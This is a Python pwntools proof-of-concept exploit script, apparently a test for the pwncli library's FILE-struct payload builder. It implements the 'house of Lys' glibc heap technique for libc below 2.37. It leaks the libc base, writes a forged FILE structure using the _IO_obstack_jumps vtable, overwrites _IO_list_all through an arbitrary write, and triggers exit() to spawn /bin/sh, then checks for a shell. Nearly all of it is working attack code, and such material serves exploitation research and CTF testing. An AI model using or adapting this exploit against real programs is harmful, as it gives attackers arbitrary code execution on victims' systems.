"""house_of_Lys_getshell_when_exit_under_2_37 的 POC（libc < 2.37）

Technique: Use _IO_obstack_jumps vtable to call system("/bin/sh") via
obstack's chunk_free function pointer.

Trigger: exit() calls _IO_flush_all_lockp -> _IO_OVERFLOW
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from pwn import *
from pwncli.utils.toolkit.io_file import IO_FILE_plus_struct
from helper import *

context.arch = "amd64"
context.log_level = "info"

GLIBC_VERSION = "2.35-0ubuntu3"
IO_OBSTACK_JUMPS_OFFSET = 0x2163c0


def exploit():
    io, elf, libc = start(GLIBC_VERSION)

    libc.address = leak_libc_base(io, libc)
    log.success(f"libc base: {hex(libc.address)}")

    system = libc.sym['system']
    _IO_obstack_jumps = libc.address + IO_OBSTACK_JUMPS_OFFSET

    log.info(f"_IO_obstack_jumps: {hex(_IO_obstack_jumps)}")
    log.info(f"system: {hex(system)}")

    # Allocate a chunk for the fake FILE struct
    fp_addr = alloc(io, 0, 0x200)
    log.info(f"fake FILE at: {hex(fp_addr)}")

    fake_file = IO_FILE_plus_struct()
    payload = fake_file.house_of_Lys_getshell_when_exit_under_2_37(
        system_addr=system,
        _IO_obstack_jumps_addr=_IO_obstack_jumps,
        fp_heap_addr=fp_addr,
    )

    # Write the fake FILE struct
    edit(io, 0, payload.ljust(0x200, b'\x00'))

    # Now we need to make _IO_list_all point to our fake FILE
    # or chain from an existing FILE to our fake one
    _IO_list_all = libc.sym['_IO_list_all']
    arb_write(io, _IO_list_all, p64(fp_addr))

    # Trigger via exit
    log.info("Triggering exit()...")
    do_exit(io)

    io.sendline(b"echo PWNED")
    try:
        result = io.recvuntil(b"PWNED", timeout=3)
        if b"PWNED" in result:
            log.success("house_of_Lys_getshell_when_exit_under_2_37: SUCCESS")
            io.close()
            return True
    except:
        pass

    log.failure("house_of_Lys_getshell_when_exit_under_2_37: FAILED")
    io.close()
    return False


if __name__ == "__main__":
    result = exploit()
    sys.exit(0 if result else 1)
